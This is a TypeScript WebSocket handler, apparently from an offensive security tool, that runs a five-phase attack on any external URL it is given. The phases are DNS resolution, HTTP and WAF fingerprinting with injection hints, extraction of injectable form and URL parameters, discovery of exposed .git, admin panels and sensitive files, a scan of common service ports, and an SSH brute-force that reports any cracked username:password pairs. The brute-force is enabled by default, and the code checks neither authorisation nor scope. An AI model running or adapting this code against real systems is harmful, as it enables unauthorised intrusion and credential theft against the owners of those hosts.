import type { WebSocket } from "ws";
import { probeTargetEnvironment, probeNetworkServices, probeWebDiscovery } from "../lib/targetProbe.js";
import { isSelfTarget } from "../lib/bypassEngine.js";
import { sshBruteForce, SSH_CRED_TOTAL } from "../lib/sshBrute.js";
import { logger } from "../lib/logger.js";
import { ProbeTargetRequestSchema } from "../lib/schemas.js";
import * as dns from "dns";
import * as net from "net";

const DEFAULT_PROBE_PORTS = [
  21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 389, 443, 445,
  465, 587, 636, 1433, 1521, 1883, 2049, 2375, 2376, 2379, 3306,
  3389, 4444, 5432, 5900, 5984, 5985, 5986, 6379, 6443, 7474,
  8080, 8200, 8443, 8500, 8888, 9090, 9200, 9300, 10250, 11211, 15672, 27017,
];

function send(ws: WebSocket, obj: unknown): void {
  if (ws.readyState === 1) {
    try { ws.send(JSON.stringify(obj)); } catch { /* connection closed mid-send */ }
  }
}

function dnsResolve(hostname: string): Promise<string[]> {
  return new Promise((resolve) => {
    dns.resolve(hostname, (err, addrs) => {
      if (err || !addrs || addrs.length === 0) {
        dns.resolve6(hostname, (err6, addrs6) => {
          resolve(err6 ? [] : addrs6 ?? []);
        });
      } else {
        resolve(addrs);
      }
    });
  });
}

interface DiscoveredParam {
  name:    string;
  source:  "form" | "url" | "json" | "api";
  example: string;
}

/**
 * Extracts injectable parameters from a page's HTML body.
 * Parses <form> input/select/textarea names, URL query params from <a> hrefs,
 * and JSON key names if the response looks like an API.
 */
function extractParamsFromHtml(html: string, baseUrl: string): DiscoveredParam[] {
  const seen = new Set<string>();
  const params: DiscoveredParam[] = [];

  const add = (name: string, source: DiscoveredParam["source"], example = "") => {
    const key = `${source}:${name}`;
    if (!seen.has(key) && name && name.length <= 64 && /^[\w\-\[\]\.]+$/.test(name)) {
      seen.add(key);
      params.push({ name, source, example });
    }
  };

  // 1. Form input names: <input name="..." value="...">
  for (const m of html.matchAll(/<input[^>]+>/gi)) {
    const tag  = m[0];
    const nm   = tag.match(/\bname\s*=\s*["']([^"']+)["']/i)?.[1] ?? "";
    const val  = tag.match(/\bvalue\s*=\s*["']([^"']{0,40})["']/i)?.[1] ?? "";
    const type = tag.match(/\btype\s*=\s*["'](\w+)["']/i)?.[1]?.toLowerCase() ?? "text";
    if (nm && type !== "hidden" && type !== "submit" && type !== "button" && type !== "image" && type !== "reset") {
      add(nm, "form", val);
    }
  }

  // 2. Select names: <select name="...">
  for (const m of html.matchAll(/<select[^>]+>/gi)) {
    const nm = m[0].match(/\bname\s*=\s*["']([^"']+)["']/i)?.[1] ?? "";
    if (nm) add(nm, "form", "");
  }

  // 3. Textarea names: <textarea name="...">
  for (const m of html.matchAll(/<textarea[^>]+>/gi)) {
    const nm = m[0].match(/\bname\s*=\s*["']([^"']+)["']/i)?.[1] ?? "";
    if (nm) add(nm, "form", "");
  }

  // 4. URL query params from <a href="?param=val"> and <form action="...?param=val">
  const hrefRe = /(?:href|action|src)\s*=\s*["']([^"'#]{1,300})["']/gi;
  for (const m of html.matchAll(hrefRe)) {
    const raw = m[1] ?? "";
    try {
      const u = new URL(raw, baseUrl);
      for (const [k, v] of u.searchParams.entries()) {
        if (k && !k.startsWith("_") && !["utm_source","utm_medium","utm_campaign","fbclid","gclid"].includes(k)) {
          add(k, "url", v.slice(0, 30));
        }
      }
    } catch { /* relative URL parse fail — extract manually */ }
    const qIdx = raw.indexOf("?");
    if (qIdx !== -1) {
      for (const part of raw.slice(qIdx + 1).split("&")) {
        const eqIdx = part.indexOf("=");
        const k = eqIdx >= 0 ? part.slice(0, eqIdx) : part;
        const v = eqIdx >= 0 ? decodeURIComponent(part.slice(eqIdx + 1).slice(0, 30)) : "";
        if (k && k.length <= 40 && /^[\w\-\[\]\.]+$/.test(k)) add(k, "url", v);
      }
    }
  }

  // 5. If the response looks like JSON API, extract top-level keys
  const trimmed = html.trimStart();
  if (trimmed.startsWith("{") || trimmed.startsWith("[")) {
    try {
      const obj = JSON.parse(trimmed) as unknown;
      const keys = typeof obj === "object" && obj !== null ? Object.keys(obj) : [];
      for (const k of keys.slice(0, 20)) add(k, "json", "");
    } catch { /* not parseable */ }
  }

  return params.slice(0, 50);
}

function tcpProbe(host: string, port: number, timeoutMs: number): Promise<boolean> {
  return new Promise((resolve) => {
    const sock = new net.Socket();
    let done = false;
    const finish = (v: boolean) => { if (!done) { done = true; try { sock.destroy(); } catch { /**/ } resolve(v); } };
    sock.setTimeout(timeoutMs);
    sock.on("connect", () => finish(true));
    sock.on("error",   () => finish(false));
    sock.on("timeout", () => finish(false));
    sock.connect(port, host);
  });
}

export function handleProbeTarget(ws: WebSocket): void {
  ws.once("message", (raw) => {
    let _parsed: unknown;
    try { _parsed = JSON.parse(raw.toString()); } catch {
      send(ws, { type: "error", message: "invalid JSON" });
      ws.close();
      return;
    }
    const _r = ProbeTargetRequestSchema.safeParse(_parsed);
    if (!_r.success) {
      send(ws, { type: "error", message: _r.error.issues.map(i => i.message).join("; ") });
      ws.close();
      return;
    }
    const req = _r.data;

    const url        = (req.url ?? "").trim();
    const scanPorts  = req.scanPorts !== false;
    const doSshBrute = req.sshBrute !== false;
    const portList   = Array.isArray(req.ports) && req.ports.length > 0
      ? req.ports.map(Number).filter((p) => p > 0 && p < 65536)
      : DEFAULT_PROBE_PORTS;

    if (!url) {
      send(ws, { type: "error", message: "url is required" });
      ws.close();
      return;
    }

    let parsed: URL;
    try { parsed = new URL(url); } catch {
      send(ws, { type: "error", message: `invalid URL: ${url}` });
      ws.close();
      return;
    }

    if (isSelfTarget(url)) {
      send(ws, { type: "error", message: "Self-targeting is disabled. Set an external target URL." });
      ws.close();
      return;
    }

    const hostname = parsed.hostname;
    logger.info({ url, scanPorts, doSshBrute }, "ws/probe start");

    let aborted = false;
    ws.on("close", () => { aborted = true; });

    void (async () => {
      // ── Phase 1: DNS resolution ──────────────────────────────────────
      send(ws, { type: "progress", message: `[1/5] Resolving hostname: ${hostname}` });
      const addrs = await dnsResolve(hostname);
      if (aborted) return;

      if (addrs.length === 0) {
        send(ws, { type: "progress", message: `[DNS] FAILED — hostname does not resolve: ${hostname}` });
        send(ws, { type: "unreachable", message: `Target unreachable: ${hostname} — DNS resolution failed. Host does not exist or is not public.` });
        send(ws, { type: "end" });
        ws.close();
        return;
      }

      send(ws, { type: "progress", message: `[DNS] Resolved to: ${addrs.slice(0, 4).join(", ")}` });

      // ── Phase 2: Quick TCP connectivity check on port 80/443 ────────
      send(ws, { type: "progress", message: `[2/5] Testing TCP connectivity on port 80 and 443...` });
      const tcpPort  = parsed.port ? Number(parsed.port) : (parsed.protocol === "https:" ? 443 : 80);
      const tcpAlive = await tcpProbe(hostname, tcpPort, 4000);
      if (aborted) return;

      // ── Phase 3: HTTP fingerprinting ─────────────────────────────────
      send(ws, { type: "progress", message: `[3/5] HTTP fingerprinting: ${url}` });

      let httpReachable = false;
      try {
        const env = await probeTargetEnvironment(url, 10000);
        if (aborted) return;

        if (env.reachable) {
          httpReachable = true;
          const summaryLines = [
            `Status    : HTTP ${env.statusCode}  (${env.responseTime}ms)`,
            `OS        : ${env.os.toUpperCase()} [${env.osConfidence} confidence]`,
            `Server    : ${env.server      || "unknown"}`,
            `Language  : ${env.language    || "unknown"}`,
            `Framework : ${env.framework   || "unknown"}`,
            `CMS       : ${env.cms         || "none detected"}`,
            `WAF       : ${env.waf ? `${env.waf} [${env.wafConfidence} confidence]` : "none detected"}`,
            `Body      : ${env.bodyLength} bytes`,
            env.redirectUrl ? `Redirect  : ${env.redirectUrl}` : "",
            "",
            "── Notable Headers ──",
            ...Object.entries(env.headers)
              .filter(([k]) => ["server","x-powered-by","x-aspnet-version","x-runtime","via",
                "x-frame-options","content-security-policy","strict-transport-security","x-generator",
                "x-powered-by","x-drupal-cache","x-nextjs-page","x-amzn-requestid","cf-ray"].includes(k))
              .map(([k, v]) => `  ${k}: ${v}`),
            env.cookies.length > 0 ? "" : null,
            env.cookies.length > 0 ? "── Cookies ──" : null,
            ...env.cookies.slice(0, 6).map(c => `  ${c.split(";")[0]}`),
            "",
            "── Injection Hints ──",
            ...env.injectHints.map(h => `  ${h}`),
          ].filter((l): l is string => l !== null && l !== undefined && (l !== "" || true)).join("\n");

          send(ws, { type: "result", env, summary: summaryLines });

          // Parameter discovery from page HTML
          if (!aborted && env.bodyPreview) {
            const discoveredParams = extractParamsFromHtml(env.bodyPreview, url);
            if (discoveredParams.length > 0) {
              send(ws, { type: "param_discovery", params: discoveredParams });
              const pLines = [
                `── Parameter Discovery (${discoveredParams.length} found) ──`,
                ...discoveredParams.map(p => `  [${p.source.padEnd(6)}] ${p.name}${p.example ? ` = "${p.example}"` : ""}`),
              ];
              send(ws, { type: "progress", message: pLines.join("\n") });
            }
          }

          // Web discovery
          if (!aborted) {
            send(ws, { type: "progress", message: `[WEB] Running path discovery on ${url}` });
            try {
              const webDisc = await probeWebDiscovery(url, 10000);
              if (!aborted) {
                send(ws, { type: "web_discovery", discovery: webDisc });
                const discLines: string[] = ["── Web Discovery ──"];
                if (webDisc.gitExposed)  discLines.push("  [CRITICAL] /.git/HEAD exposed — source code recoverable via git-dumper");
                if (webDisc.phpinfo)     discLines.push("  [HIGH] phpinfo() page exposed — reveals server internals");
                if (webDisc.dirListing)  discLines.push("  [MEDIUM] Directory listing enabled");
                for (const p of webDisc.adminPanels)   discLines.push(`  [+] Admin panel: ${p.path} (HTTP ${p.status})`);
                for (const f of webDisc.sensitiveFiles) discLines.push(`  [!] Sensitive file accessible: ${f.path} (HTTP ${f.status})`);
                if (webDisc.robotsTxt) {
                  const disallowed = webDisc.robotsTxt.split("\n")
                    .filter(l => /^Disallow:/i.test(l)).slice(0, 10).map(l => l.trim());
                  if (disallowed.length) discLines.push("  robots.txt disallowed:", ...disallowed.map(l => `    ${l}`));
                }
                if (discLines.length > 1) send(ws, { type: "progress", message: discLines.join("\n") });
              }
            } catch { /* web discovery failure is non-fatal */ }
          }
        } else {
          send(ws, { type: "progress", message: `[HTTP] No HTTP response from ${url} — continuing with TCP scan` });
        }
      } catch (e) {
        send(ws, { type: "progress", message: `[HTTP] Error: ${(e as Error).message} — continuing with TCP scan` });
      }

      if (aborted) return;

      // ── Phase 4: TCP port scan (always runs as long as DNS resolved) ─
      let sshOpen = false;
      if (scanPorts) {
        send(ws, { type: "progress", message: `[4/5] TCP service scan on ${hostname} — ${portList.length} ports` });
        try {
          const services = await probeNetworkServices(hostname, portList, 3000);
          if (!aborted) {
            send(ws, { type: "service_fingerprints", host: hostname, services });
            sshOpen = services.some(s => s.port === 22);
            if (services.length === 0) {
              send(ws, { type: "progress", message: `── Service Fingerprints ──\n  No open ports found in scanned list` });
            } else {
              const svcLines = ["── Service Fingerprints ──"];
              for (const s of services) {
                svcLines.push(`  ${String(s.port).padEnd(6)} ${s.service.padEnd(16)} ${s.version || ""}`.trimEnd());
                for (const h of s.vulnHints) svcLines.push(`         [!] ${h}`);
              }
              send(ws, { type: "progress", message: svcLines.join("\n") });
            }
          }
        } catch (e) {
          send(ws, { type: "progress", message: `[TCP] Scan error: ${(e as Error).message}` });
        }
      }

      if (aborted) return;

      // ── Phase 5: SSH brute-force (only when port 22 confirmed open) ──
      if (doSshBrute && sshOpen) {
        send(ws, {
          type: "progress",
          message:
            `[5/5] SSH brute-force on ${hostname}:22\n` +
            `      Trying ${SSH_CRED_TOTAL} credential pairs (concurrency=5, timeout=6s/attempt)`,
        });
        send(ws, { type: "ssh_brute_start", host: hostname, total: SSH_CRED_TOTAL });

        let lastPct = -1;
        const results = await sshBruteForce({
          host:        hostname,
          port:        22,
          concurrency: 5,
          timeoutMs:   6000,
          stopOnFirst: false,
          onProgress: (tried, total, found) => {
            if (aborted) return;
            const pct = Math.floor((tried / total) * 100);
            if (pct !== lastPct && (pct % 5 === 0 || found.length > 0)) {
              lastPct = pct;
              send(ws, {
                type:    "ssh_brute_progress",
                tried,
                total,
                pct,
                found:   found.length,
              });
            }
          },
          onFound: (hit) => {
            if (aborted) return;
            send(ws, {
              type:     "ssh_brute_found",
              user:     hit.user,
              password: hit.password,
              banner:   hit.banner,
              host:     hit.host,
              port:     hit.port,
            });
            send(ws, {
              type:    "progress",
              message: `[SSH] ✓ CREDENTIAL FOUND: ${hit.user}:${hit.password}${hit.banner ? ` | Banner: ${hit.banner}` : ""}`,
            });
          },
        });

        if (!aborted) {
          if (results.length === 0) {
            send(ws, { type: "progress", message: `[SSH] Brute-force complete — no valid credentials from ${SSH_CRED_TOTAL} pairs` });
          } else {
            send(ws, {
              type:    "progress",
              message: `[SSH] Brute-force complete — ${results.length} credential(s) found:\n` +
                results.map(r => `  ${r.user}:${r.password}`).join("\n"),
            });
          }
          send(ws, { type: "ssh_brute_end", results });
        }
      } else if (doSshBrute && !sshOpen) {
        send(ws, { type: "progress", message: `[5/5] SSH brute-force skipped — port 22 not open` });
      }

      if (aborted) return;

      // ── Final reachability verdict ────────────────────────────────────
      if (!httpReachable && !tcpAlive) {
        send(ws, { type: "unreachable", message: `Host ${hostname} resolved via DNS (${addrs[0]}) but all tested ports are closed or filtered — target may be firewalled or offline.` });
      }

      send(ws, { type: "end" });
      ws.close();
    })();
  });
}
